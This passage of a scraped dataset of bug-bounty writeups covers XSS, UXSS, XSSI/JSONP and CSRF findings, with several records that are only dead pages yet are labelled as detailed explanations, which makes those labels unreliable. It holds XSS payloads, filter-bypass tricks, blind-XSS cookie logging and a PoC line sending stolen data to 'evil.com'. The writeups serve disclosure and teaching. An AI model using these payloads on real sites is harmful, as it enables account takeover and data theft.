= location.hash.substr(1); b || window.close(); var c = b.split(\"&\"), d = decodeURIComponent(c[0]); // Only the below line needed to be changed // to check if the location hash begins with http: 0 != d.indexOf(\"http\") && window.close(); a.action = d; for (var e = 1; e < c.length; e++) { var f = c[e].split(\"=\"), g = document.createElement(\"input\"); g.type = \"hidden\"; g.name = f[0]; g.value = decodeURIComponent(f[1]); a.appendChild(g) } a.submit(); }).call(this); The Timeline Vulnerability reported: Dec 27, 2019, 01:01 AM Vulnerability triaged: Dec 27, 2019, 08:32 PM Issue fixed by Google: Jan 8, 2020 Bounty paid: Jan 8, 2020 Bounty amount: USD 5000 Get the latest content on web security in your inbox each week. We respect your privacy SHARE THIS POST THE AUTHOR Andrey Leonov Independent Security Researcher Andrey Leonov (4lemon) is an independent web application security researcher and an Acunetix fan. He often works together on security research with his colleague, Link . Related Posts: How I Found an XSS in Google using Acunetix Read more Mutation XSS in Google Search Read more XSS in Google Feedburner Read more Most Popular Articles: SQL Injection (SQLi) Read more Cross-Site Scripting (XSS) Read more How to Hack Google: Google Hacking (Dorking) Explained Read more Older Newer Subscribe by Email Get the latest content on web security in your inbox each week. We respect your privacy Learn More IIS Security Apache Troubleshooting Security Scanner DAST vs SAST Threats, Vulnerabilities, & Risks Vulnerability Assessment vs Pen Testing Server Security Google Hacking Blog Categories Articles Web Security Zone News Events Product Releases Product Articles Product Information AcuSensor Technology AcuMonitor Technology Acunetix Integrations Vulnerability Scanner Support Plans Use Cases Penetration Testing Software Website Security Scanner External Vulnerability Scanner Web Application Security Vulnerability Management Software Website Security Cross-site Scripting SQL Injection Reflected XSS CSRF Attacks Directory Traversal Learn More White Papers TLS Security WordPress Security Web Service Security Prevent SQL Injection Company About Us Customers Become a Partner Careers Contact Documentation Case Studies Documentation Videos Vulnerability Index Webinars Login Invicti Subscription Services Agreement Privacy Policy Terms of Use Sitemap Find us on Facebook Follow us on Twiter Follow us on LinkedIn © Acunetix 2025, by Invicti"}
{"source_url": "https://0x65.dev/blog/2020-03-30/cve-2019-17004-semi-universal-xss-affecting-firefox-for-ios.html", "title": "CVE-2019-17004âSemi Universal XSS affecting Firefox for iOS", "friendly_explanation": "This is a bug bounty writeup from https://0x65.dev/blog/2020-03-30/cve-2019-17004-semi-universal-xss-affecting-firefox-for-ios.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nCVE-2019-17004âSemi Universal XSS affecting Firefox for iOS Home Team Careers Privacy policy Impressum Dissemination @ Cliqz Tech @ Cliqz search privacy web security CVE-2019-17004âSemi Universal XSS affecting Firefox for iOS This bug allowed an attacker to potentially execute malicious JavaScript on arbitrary origins. March 30th, 2020 There is a kind of security flaw in Web browsers and extensions that can enable an attacker to bypass the same-origin policy [1] checks and take over your online activity by simply having you visit a web page; allowing accessing your bank account, learning about your search queries on Google, your emails, your messages on Facebook, etc. It can even enable the attacker to impersonate you and perform actions on your behalf. These flaws are called: Universal Cross-Site Scripting [2] . In October 2019, we discovered such a security flaw in Firefox for iOS, which allowed malicious actors to execute JavaScript on arbitrary origins. Cliqz browsers are based on Firefox , and from time to time we conduct security and privacy audits of upstream projects, other browsers and our own products across platforms. These audits allowed us to discover some critical issues in the past [3] . In November last year, the Cliqz browser for iOS was undergoing a complete overhaul. While auditing the app for security issues during its development phase, we discovered a Universal Cross-Site Scripting (UXSS) vulnerability. We tested the production version of Firefox (Version 19.1 - 16203) and realized that it had the same vulnerability, therefore we reported the issue via the Client Security Bug Bounty Program to Mozilla. At that time we tested a few other popular browsers on iOS and none of them had this issue. Some of them, like Safari, were even explicit in their error reporting :) However, in January this year, when we were about to publish our findings, we did our due diligence and performed a sanity check on popular iOS browsers again. We found that this time Brave for iOS suffered from the same security issue. After reporting the issue to Brave, they promptly fixed it, but we wanted to wait for a few more months before publishing the details about this security issue to give users time to update to the latest version. The Attack Letâs imagine the user (victim) opens Firefox for iOS, and does a query on default search engine (In this example: https://www.google.com/). The user then visits an attacker-controlled website in the same tabâby either pasting a link, selecting a link from the webpage or any other means. This website returns the following malicious response Location header: Because of a bug in the browser, an attacker is able to execute JavaScript in the context of the previously visited website (i.e. google.com in this case) by returning a redirect to javascript: doEvil , Being able to execute JavaScript on a different origin, opens a wide range of attacks. For example, not only can the attacker read sensitive data like cookies or the URL from webpages. They can also return JavaScript which performs API requests to retrieve information such as the last 10 queries that the user has submitted on google.com. It is important to note that this issue only classifies as semi-UXSS because attackers cannot steal data from any website of their choice, but are limited to the last visited domain. For example, in the above case, if the attacker returns a JavaScript code in location header, that tries to steal data or execute actions on https://meine.deutsche-bank.de/trxm/db/ , the attack will only work as long as the last website visited in that tab was https://meine.deutsche-bank.de/ . However, even given the above limitations the attacker can curate special links and lure the users into opening these malicious links by sharing them on social media, chat platforms, etc. If the user clicks on such links on these websites, the attacker can now try and exfiltrate sensitive user data from the website where the link was clicked from. Given the impact of the vulnerability, the fact that it was present in production versions and was easily exploitable, Mozilla classified this bug as sec-critical [4] . Cause The issue here was that Firefox for iOS had insufficient checks to block JavaScript from being executed when returned via Location response header. This bug originated from the bookmarklets functionality [5] added in Firefox for iOS. In order to fix this security issue, Firefox decided to remove this functionality altogether from the browser. Timeline UXSS flaws in browsers are neither new nor uncommon [6] . We appreciate Mozillaâs and Braveâs efforts in enabling security researchers to not only report such issues, but also for fixing them with the highest priority to keep the users safe. 2019-10-15: Issue discovered and reported to Firefox . 2019-10-17: Firefox developers acknowledged and confirmed the bug as a security issue. 2019-10-17: Issue fixed on Github . 2019-10-22: Firefox for iOS v20.0 released with the security issue fixed. 2020-01-31: Same issue discovered in Brave for iOS [7] and reported to the Brave browser team via HackerOne . 2020-02-01: Issue was patched in Brave for iOS and a new version was released. 2020-02-04: Brave confirmed via HackerOne, that new version was published on the App Store. Footnotes https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy . â©ï¸ Unlike the common XSS attacks, UXSS is a type of attack that exploits client-side vulnerabilities in the browser or browser extensions in order to generate an XSS condition, and execute malicious code. When such vulnerabilities are found and exploited, the behavior of the browser is affected and its security features may be bypassed or disabled. Source â©ï¸ https://0x65.dev/pages/dissemination-cliqz.html#security â©ï¸ Critical vulnerabilities are urgent security issues that present an ongoing or immediate danger to Firefox users. There is no technical difference between sec-critical and sec-high vulnerabilities, they only differ based on the risk users are exposed to. Certain sec-critical vulnerabilities will cause an immediate dot-release to be issuedâ Source . â©ï¸ https://en.wikipedia.org/wiki/Bookmarklet â©ï¸ Some examples of UXSS bugs in Browsers: UXSS in Safari WebKit , Browser logic vulnerabiliteis , UXSS: Origin confusion when reloading isolated data:text/html URL , Firefox uXSS and CSS XSS , and UXSS in Chrome Android . â©ï¸ We did not find the vulnerability in Brave in October, as the version of Firefox they were using was an old one. Brave did a release in Novemberâ19 , which was based on the version of Firefox that had the security issue. Therefore, in our sanity check before publishing the blog post in Febuary we found Brave for iOS to have the same security issue. â©ï¸ Share this article Â© Cliqz GmbH - All rights reserved RSS Onion DAT"}
{"source_url": "https://evanricafort.blogspot.com/2019/12/html-injection-to-xss-bypass-in.html", "title": "Redirecting", "friendly_explanation": "This is a bug bounty writeup from https://evanricafort.blogspot.com/2019/12/html-injection-to-xss-bypass-in.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nRedirecting You're about to be redirected The blog that used to be here is now at http://blog.evanricafort.com/2019/12/html-injection-to-xss-bypass-in.html. Do you wish to be redirected? This blog is not hosted by Blogger and has not been checked for spam, viruses and other forms of malware. Yes No Help Help Centre Help Forum Video Tutorials Community Blogger Buzz Developers Blogger API Developer Forum © 1999 – 2025 Google Terms of Service Privacy Content Policy"}
{"source_url": "https://medium.com/@abhishake100/how-i-turned-self-xss-to-stored-via-csrf-d12eaaf59f2e", "title": "How I turned Self XSS to Stored via CSRF | by Abhishek | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@abhishake100/how-i-turned-self-xss-to-stored-via-csrf-d12eaaf59f2e. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nHow I turned Self XSS to Stored via CSRF | by Abhishek | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in How I turned Self XSS to Stored via CSRF Abhishek 3 min read · Nov 29, 2019 -- 1 Listen Share Press enter or click to view image in full size Curated list of Bug Bounty programs — https://bugbountydirectory.com Since the company told me to keep the name private, lets call it private.com So private.com allows users to create groups and then invite other users to share anything in that group. So i tried to find XSS in the group name and i found it quickly, like pretty quickly. My payload was <script>alert(1)</script> in the group name and i got a pop-up. Press enter or click to view image in full size So i tried to see if other users get impacted as well. I quickly created an account and invited the user to my group. The XSS didn’t execute, it was all encoded. I tried to bypass it but didn’t have any luck. So this was just a Self XSS.😑 So i started looking around for something else and i noticed that group names were encoded everywhere except for the dialog box that appeared after creating a group. We’ve added zxc Press enter or click to view image in full size Turns out the self XSS i found was of the dialog box and not the group name itself and so i thought what if somehow i managed to create a group on behalf of the user and then the dialog box will appear executing the XSS. So i started burpsuite and i looked at the request and voila. Press enter or click to view image in full size There was no CSRF protection against the request so i quickly generated a working PoC and tried it and boom XSS got executed and i was like. This was a great find for me as it impacted other users. Technically i don’t think its a stored XSS as it will execute only once after the user visits the link. Press enter or click to view image in full size Bounty They fixed it quickly within 2 days by completely removing the dialog box and adding CSRF protection. I hope you learned something from this and if you liked it then please share. Follow me on twitter — https://twitter.com/abhishekY495 Thank You. Security Bug Bounty Pentesting Bugs Xss Attack -- -- 1 Written by Abhishek 713 followers · 0 following https://bugbountydirectory.com Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@elmrhassel/xss-stored-on-outlook-web-outlook-android-app-ad4bd46b8823", "title": "410 Deleted by author — Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@elmrhassel/xss-stored-on-outlook-web-outlook-android-app-ad4bd46b8823. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n410 Deleted by author — Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Error 410 User deactivated or deleted their account."}
{"source_url": "https://hackerone.com/reports/881918", "title": "HackerOne", "friendly_explanation": "This is a bug bounty writeup from https://hackerone.com/reports/881918. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nHackerOne"}
{"source_url": "https://medium.com/@navne3t/150-xss-at-error-page-of-respository-code-4fc628892742", "title": "$150 XSS at Error Page of Respository Code | by Navneet | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@navne3t/150-xss-at-error-page-of-respository-code-4fc628892742. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n$150 XSS at Error Page of Respository Code | by Navneet | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in $150 XSS at Error Page of Respository Code Navneet 1 min read · Dec 7, 2019 -- Listen Share This article is about a security bug/issue i have found at private program on Hackerone(H1). As the title says the bug was Reflected XSS. The parameter which was vulnerable to XSS was not at the website of the program but in the code which was at the GitHub respository of the program. I searched at GitHub by the name of private program and found they have few codes written in different programming languages. Out of those i look for bug at the PHP code. So ,i look for $_GET[’someParameter’] which should take value of “someParameter” like this localhost/ThePHPcode/thePage.php? someParameter=XSS_PayLoad And successfully was able to find one of the parameter in the one of the code file which was a default error page as mentioned above i.e. $_GET[’someParameter’] Now , i inserted the payload and successfully able to pop up the alert box with document.cookie. So, i report them by explaining that if some website use their code to integrate the functionality which their code provide then that website becomes vulnerable to XSS because that website have their vulnerable code. This report was submitted more than a year ago from today’s date. So, i got surprise of $150 after a year. Feedback and comments are welcomed. -- -- Written by Navneet 136 followers · 0 following I am a Computer Science - Information Security student. I write stuff about web application security bugs/issues. No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/bugbountywriteup/effortlessly-finding-cross-site-script-inclusion-xssi-jsonp-for-bug-bounty-38ae0b9e5c8a", "title": "Effortlessly finding Cross Site Script Inclusion (XSSI) & JSONP for bug bounty | by Omkar Bhagwat (th3_hidd3n_mist) | InfoSec Write-ups", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/bugbountywriteup/effortlessly-finding-cross-site-script-inclusion-xssi-jsonp-for-bug-bounty-38ae0b9e5c8a. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nEffortlessly finding Cross Site Script Inclusion (XSSI) & JSONP for bug bounty | by Omkar Bhagwat (th3_hidd3n_mist) | InfoSec Write-ups Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in InfoSec Write-ups · Follow publication A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow publication Effortlessly finding Cross Site Script Inclusion (XSSI) & JSONP for bug bounty Omkar Bhagwat (th3_hidd3n_mist) 2 min read · Dec 27, 2019 -- Listen Share I’ve moved my blog to https://th3hidd3nmist.github.io/ Hey everyone, I recently reported a dupe for a XSSI bug on a private program which paid out $̶3̶0̶0̶ ($800 Updated 13 Feb 2020) to the original reporter. I b̶e̶l̶i̶e̶v̶e̶ ̶t̶h̶e̶ ̶r̶e̶p̶o̶r̶t̶e̶r̶ ̶i̶s̶ ̶u̶n̶d̶e̶r̶p̶a̶i̶d̶ ̶s̶i̶n̶c̶e̶ ̶s̶e̶r̶i̶o̶u̶s̶ ̶i̶n̶f̶o̶r̶m̶a̶t̶i̶o̶n̶ ̶w̶a̶s̶ ̶l̶e̶a̶k̶e̶d̶ ̶¯̶\\̶_̶(̶ツ̶)̶_̶/̶¯̶,̶ ̶&̶ decided to share the methodology I follow. tl;dr (also read important notes at the bottom) Press enter or click to view image in full size Cheat sheet or something idk lol Good reads, in case you’re new to XSSI/JSONP: XSSI: https://www.scip.ch/en/?labs.20160414 JSONP: https://www.sjoerdlangkemper.nl/2019/01/02/jsonp My Methodology : After spidering the website (manual & automated), I filtered the results in Burp suite by MIME type, then skim through the responses of type “ script ” for sensitive information. Press enter or click to view image in full size Filtering by MIME type I found a JS file which includes all the information that I filled in when signing up for an insurance policy. This included SSN, limited medical history, visa info, name, phone number, DOB, address etc. Yikes . I look at the HTTP GET request for the JS file to make sure that it doesn’t require CORS triggering headers like: Authorization, X-API-KEY, X-CSRF-TOKEN, X-whatever At this stage if it does have CORS headers then, the attack will fail , unless I also find a CORS issue. In this case, no special headers were needed, so I could include the JS file on a web page with a script tag and send it to any server leaking some serious PII, with the POC being similar to: <script src=\"https://target.com/vuln.js\"> </script> <script defer> // var_name is a variable in vuln.js holding sensitive information console.log(var_name); // sending information to an attacker controlled server fetch(\"https://evil.com/stealInfo?info=\"+var_name); </script> You can use the same way to find JSONP callbacks by appending parameters like callback=some_function, jsonp=blah on all paths that return sensitive information. Important Notes: Sometimes you’ll need multiple parameters to trigger a JSONP response. For example: http://target.com?callback=test → no JSONP http://target.com? type=jsonp&callback=test → returns JSONP If the response has Content-Type: application/json but the body has JSONP/javascript, and the X-Content-Type-Options: nosniff header is NOT in the response, the exploit still WORKS . For JSONP, different callback parameters might work on different endpoints even on the same website. Example: https://target.com/profile_info? callback =test→ no JSONP https://target.com/profile_info? jsonp= test→ returns JSONP But, on a different path on the same site: https://target.com/ account_info ? jsonp =test→ no JSONP https://target.com/ account_info ? jsoncallback =test→ returns JSONP Feedback and constructive criticism are appreciated, thanks for reading! Follow Infosec Write-ups for more such awesome write-ups. InfoSec Write-ups A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub… medium.com Bug Bounty Infosec Web Security Writeup Methodology -- -- Follow Published in InfoSec Write-ups 67K followers · Last published 18 hours ago A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow Written by Omkar Bhagwat (th3_hidd3n_mist) 292 followers · 133 following New bug bounty hunter, old gamer and anime fan. No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@mohameddaher/how-i-paid-2-for-1054-xss-bug-20-chars-blind-xss-payloads-12d32760897b", "title": "How I paid 2$ for a 1054$ XSS bug + 20 chars blind XSS payloads | by Mohamed Daher | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@mohameddaher/how-i-paid-2-for-1054-xss-bug-20-chars-blind-xss-payloads-12d32760897b. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nHow I paid 2$ for a 1054$ XSS bug + 20 chars blind XSS payloads | by Mohamed Daher | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in How I paid 2$ for a 1054$ XSS bug + 20 chars blind XSS payloads Mohamed Daher 4 min read · Nov 20, 2019 -- 4 Listen Share Hey there :) This is my first write up, I decided to share this story because I spent nights on it and I finally found a solution to my problem. The story : I was invited some months ago to a private bugcrowd program that was going to start some days later. I found some bugs and took a break. During the last 5 days of the program I told myself I have to find some bugs before this program ends ( I want $$ boiiii) so I took another view of the program. Checked the scope again etc… This private program was a big social network (can’t tell the name it’s private bruh) but the point is I went to create a new account. Username : I enter an XSS payload but no special character allowed : <:’();?> and the field was limited to 20 characters : Press enter or click to view image in full size So I forgot about XSS and looked for another bugs. Later I visited the 2nd in scope domain that was another social media, tried to create a new account using my email but I got an error : User already registered, please login. What happens ? Seems like the 2 sites use the same database so you could use the same account for the 2 sites. So I logged in and moved to my profile and though I will try and edit my username here, I was surprised that there was not characters restricted :D I was like : But this field is limited to 20 chars too :( I first entered a simple payload to confirm the XSS : <svg/onload=alert()> = 20 chars I saved and visited my profile on the main site (I want it to work on the main site because the bounties here were higher). And boom alert box appear :D Now that XSS is valid, time to work on a XSS payload to log cookies of who ever visits my profile, because remember : the higher the security impact is, the higher the bounty will be, thanks master yoda. But the problem is, how to enter a valid 20 chars XSS payload to log cookies? the xsshunter tool is useful but way too long, so I started digging every night and after 48 hours I found this tweet with this short payload from @0x6D6172696F : Press enter or click to view image in full size <script/src=//⑭.₨> = 18 chars (₨ here is Indian Rupee and is considered as 1 char instead of 2, same for the ⑭) But it says only in MS Edge so I told myself I have nothing to lose so I entered this payload in Chrome and Firefox and boom. XSS triggers. Now, I had to rent a (2 numbers).rs domain for the PoC, but the prices are quite high for me (90 usd approx), so I asked myself how can I reach the highest impact without spending 90 usd ? After some days I had an idea, I directly went to namecheap.com (thanks to @brutelogic) to check the cheaper .2chars domain and found .pw, so I checked for RsRs.pw : It was 90 cents/year :D So the domain + dns = approx. 2.10$ I directly went to the panel and redirected rsrs.pw to my xsshunter link (name).xsshunter.com where my blind XSS payload is hosted, returned to the site and created this payload : <script src=//₨₨.pw> = 20 chars. Saved it and visited my profile, and boom : Press enter or click to view image in full size Me, talking to myself : After 1 month (till they fixed this) I got +600 victims without doing anything (kept receiving emails from xsshunter) and +1000$ bounty :) I know this is long but I can’t resume 5 nights of work in 10 lines ^^ Take-away: When you see characters limitation or when a character is restricted somewhere, try to embed 2 chars into 1 or use the Greek dictionary to find a similar character. Sometimes you can go to an out of scope domain or lowest bounty domain to get a valid bug/high bounty bug Thank you for reading, Daher Mohamed aka m0m0x01d :) Tech Bug Bounty Pentest Bugcrowd -- -- 4 Written by Mohamed Daher 458 followers · 0 following Hey Responses ( 4 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@pflash0x0punk/how-paypal-helped-me-to-generate-xss-9408c0931add", "title": "How PayPal helped me to generate XSS | by Pflash Punk | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@pflash0x0punk/how-paypal-helped-me-to-generate-xss-9408c0931add. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nHow PayPal helped me to generate XSS | by Pflash Punk | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Mastodon How PayPal helped me to generate XSS Pflash Punk 2 min read · Oct 20, 2019 -- 2 Listen Share Hi , I was on break for a year because of my dad’s health issue :( But now I’am back :D This is my first write up on medium.com , its a old finding but may help you ;) Ok. So one day I was doing some work with my friend and visited PayPal to get a Pay with PayPal button. I logged in to PayPal and moved to tools section and clicked on PayPal buttons. After clicking PayPal redirected me to https://financing.paypal.com/ppfinportal/adGenerator Here we can create buttons. While generating a button I looked on the URL bar and got excited. The URL was some thing like this https://financing.paypal.com/ppfinportal/adGenerator/emailCopy?size= 320x200 The banner size was in url .So i decided to test it. I’ve changed the size to LOL and got surprised , the width size in embed code changed to LOL Now what :P I’ve changed LOL string to a XSS payload and the size became “><img src=x onerror=prompt(1)> Now the size in embed code became “><img src=x onerror=prompt(1)> . Which means if you’ll use the infected embed code you’ll be greeted by XSS popup :P Press enter or click to view image in full size Look at the embed code carefully :P So this accidental XSS gave me 250$ :D Xss Attack Xss Vulnerability PayPal Bug Bounty Penetration Testing -- -- 2 Written by Pflash Punk 99 followers · 2 following Bug hunter , learner , CO-Founder @ Blackroot Technologies :) Responses ( 2 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://victoni.github.io/bug-hunting-xss-on-cookie-popup-warning/", "title": "Site not found · GitHub Pages", "friendly_explanation": "This is a bug bounty writeup from https://victoni.github.io/bug-hunting-xss-on-cookie-popup-warning/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nSite not found · GitHub Pages 404 There isn't a GitHub Pages site here. If you're trying to publish one, read the full documentation to learn how to set up GitHub Pages for your repository, organization, or user account. GitHub Status — @githubstatus"}
{"source_url": "https://medium.com/@04sabsas/xss-will-never-die-eb3584081a5f", "title": "XSS will never die. Stories about 5 very different XSS | by Oleksandr Opanasiuk | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@04sabsas/xss-will-never-die-eb3584081a5f. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nXSS will never die. Stories about 5 very different XSS | by Oleksandr Opanasiuk | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in XSS will never die Oleksandr Opanasiuk 8 min read · Nov 2, 2019 -- 1 Listen Share Hello all the Penetration Testing community, hope you are doing well. Got some unusual XSS vulnerabilities for last months, but today I want to discuss the general idea of explanation, since the writeup for each of these vulnerabilities is small. So let’s go!👨‍💻 Disclaimer: there will not be complicated explanations and code analysis, this is a simple discussion of the strange concepts of protecting 5 applications and breaking it. Okay, so we have one HUGE shop-company, that has a lot of sub-domains and different applications running on them: Press enter or click to view image in full size It will be 5 parts with short story about one XSS, protection and breaking in each one. Part 1 — Stored XSS for mobile on the forum Really love forums since there are a lot of potential vulnerabilities due to a huge list of functions . I went to the forum.example.com/post?id=123 and started testing of File Upload via URL functionality — here I noticed that it taking the name of file and inserting it twice on the page — in <img> tag and in the description of the file, it looks like: Press enter or click to view image in full size Me : what if insert “ to the name? Ok, lets test http://…/1.webp” Site : Press enter or click to view image in full size Me : Ez, go onerror and report it! Site : Ahahahahahah 👋 What happens? All the DOM-events are removing ( <img/src=x/onerror=a> going to <img/src=x> 🤯). But, but it turned out that not all. As the world is always improving, DOM-events appeared for mobile too — so they were not blacklisted and we got Stored-XSS for mobile devices. Finally it was like: Also do not forget that you can use alert`1` instead of alert(1) (here service blocked all the parameters inside “()”) R esume : no blacklists will help due to the improving of technology — everything cannot be prevented. But filter quotes — it’s quite possible to try. Here we saw that a quote was inserted into html-code — and with the idea “I won’t believe that you will block all the possible DOM-events” we found that the mobile events were not blacklisted and got Stored XSS in forum post. Part 2 — Reflected XSS on email preview I got an email from our HUGE-shop, and they use the domain email.example.com to view emails, like email.example.com/view?id=123&key=abc&statname=DiscountEmail . The parameter “statname” was <input type=”hidden”> and did nit filter the “ , but filtered <> . So, we just looked how to exploit XSS in hidden input and founded “ accesskey=’X’ onclick=’alert(1)’ ”. It worked, and we got Reflected-XSS. Resume : You will increase your chances of finding vulnerabilities if you subscribe to newsletters from the service that you are testing. Firstly , you will receive news about service updates, and will be able to test it faster than other hackers (I do remember how some guy tested YouTube Beta-studio as soon as it was presented and found great IDOR in 15k$). Secondly — it is quite possible that in the email you will find vulnerable links due to less attention to such minor functionality. So after finding non-filtered quotes and quick-recon in Google “XSS hidden input”, we have found the way to exploit it with “accesskey”. Part 3 — Stored XSS in live support chat They had domain support.example.com, where we can find some information about using the service and chat online with manager in case of needing of the help. And you know what — I started chat with manager, and inserted <img src=”x” onerror=”alert(1)”> — it was injected into html-source! I was very surprised…🙈 Press enter or click to view image in full size As I later understood, no one could get to test this thing — first you have to go to the site at a time when managers are online, and this time is limited to 6 hours a day. Secondly, you need to start a chat, and for this we need to wait for about half an hour to start a conversation with an online manager. That is, from the 3rd time I decided to test this functional, and from 5th time I got into the chat — I think this explains why no one found this thing before. Resume : Any company has a lot of functionality, and sometimes some things remain outside the scope of developers. We all know that we need to test all the possible functionality, but, unfortunately, sometimes we miss vulnerabilities due to laziness or fatigue. Here we found a service that was probably created a very long time ago, but was not updated from a security point of view, since no one checked it. Part 4 — Reflected XSS in User Dashboard This is the longest vulnerability, if we count from the time when I found the first clue about the presence of the vulnerability, and until the time when I finally exploited it (Before this it was Race Condition in purchasing functionality with about 1 month. Just so that you understand how this process happens with me — when I find some interesting things, I usually record bugs info, and later, when new ideas appear, I return to them and continue to exploit). Are you become to be interested in? 😊 So here we have User Dashboard, and functionality of filtering our activities — we can insert value “ time_from ” to filter it with the dates. It was not filtering quotes, so we quickly inserted quote and got: Press enter or click to view image in full size Ok, next step — does it filter “< >” . Yes, so I decided that we would exploit this via an input element with DOM-events. But after ‘ time_from=”777\" onfocus=”alert(1)” ’ I got it: Press enter or click to view image in full size What just happened? Like in the Part1, it is filtering DOM-events and removing it . But, everything is much more complicated — they don’t have a blacklist, they just block all the parameters in the tag that starts from “on” 🤷‍♂️🙂️🤷‍♂️ Suddenly I was attracted by another coincidence on the page with the entered data and I saw such a strange field: Press enter or click to view image in full size It was something like break-links logger and… here “<>” were not filtered: Press enter or click to view image in full size I want to stop at this step so that you understand what is going on: we have a filtering function for our activities ( user.example.com/activities?time_from=777&acc=submit , and the “ time_from ” parameter is vulnerable. But there is protection in the application: it removes events (the WAF finds everything inside the tag that starts on “on”). If this happens, the logger fires, captures the broken link, and inserts it in a strange way to page source without filtering “ and <> 👍 But you remember that all DOM-events are removing — I started looking for tags that you can insert and receive XSS, but it turned out that it cuts them out just like events. Another one “but”: I noticed a strange thing — if I wrote a tag, but didn’t close it — it didn’t delete it, that is, only the closed tag was cut out. So it turned into: Press enter or click to view image in full size YES!😱 So now we can insert link to execute script, but how to close script tag? If the src is given in script tag — all the source is ignoring inside the tag, so we just need any </script> later on the page. Finally source looks like: Press enter or click to view image in full size Let me please explain again what just happened: so we found the broken value “ old_request ”, that creating if we add something potential danger to url (DOM-event). And in this value we can insert ‘<>” into source, but still can not insert tags and DOM-events. But since the input tag was closing itself — we insert “<script/src=//url and WAF do not see it as dangerous input, so do not removing. Then we discard all the garbage that is passed later through ? (as parameters for the GET request). Now the JavaScript logic gave us an advantage — since the resource for the script is specified, everything inside the tag will be ignored, and the site will wait for the closing tag — which will meet somewhere further anywhere in the source, for example, calling jQuery. So the source logic: Press enter or click to view image in full size Resume : no blacklists will help due to the improving of technology — everything cannot be prevented. But filter quotes — it’s quite possible to try. [PART1] So here we got unfiltered quot, then strange “logging functionality” with unfiltered <>, and even WAF with his blacklists is a little hard — we finally exploited it with understanding of the logic of HTML and JavaScript. Part 5— Self XSS + Clickjacking = Nice XSS The last one XSS — will be easy to understand. You sometimes meet Self-XSS, in the functionality of the editing users data, in the form of feedback, etc. But because of the fact that there is no definite request with the help of which XSS is injected — such vulnerabilities are considered as N/A due to the fact that user actions are required. But, we do have some great thing as Clickjacking — terror of the past 10 years of the web (previously it was very widespread vulnerabilities, as now IDOR). I think you know what is it, but I hope to be useful and explain this to beginners. This vulnerability arises when the site allows to be inserted to <iframe> and thus we impose it invisibly and make some forms that interfere with the coordinates of how that functionality is located on the attacked site that we want to hack — and when user use attacker’s site and inserting data there — user inserting data to another site due to iframe. Here it is described in more human language: https://www.owasp.org/index.php/Clickjacking . So on feedback.example.com/feedback we can left feedback, it forwards to another non-scope service, but inserts on the origin page “Thanks [ username ]”. And this [ username ] was not filtering any html-source, directly inserting everything to the page. Since we did not have direct request, we started to check the X-FRAME — to my luck, it turned out to be vulnerable to clickjacking, and I just created an html+css form, which showed how it works. Here you can find examples of great reports for Clickjacking: https://www.google.com/?q=site:hackerone.com%20intitle:clickjacking Resume : Increase your knowledges, because this is what will always be with you, and will help everywhere. Here, thanks to what we knew about the clickjacking , we exploited Self-XSS without any problems. Thank you so much for reading this👍 Oleksandr Opanasiuk The latest Tweets from Oleksandr Opanasiuk (@Lekssik2). Great manager and not bad pentester https://t.co/qJyb7tVAtx… twitter.com Programming Bug Bounty Cybersecurity Hacking Technology -- -- 1 Written by Oleksandr Opanasiuk 100 followers · 51 following Great pentester and not bad manager https://twitter.com/Lekssik2 Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
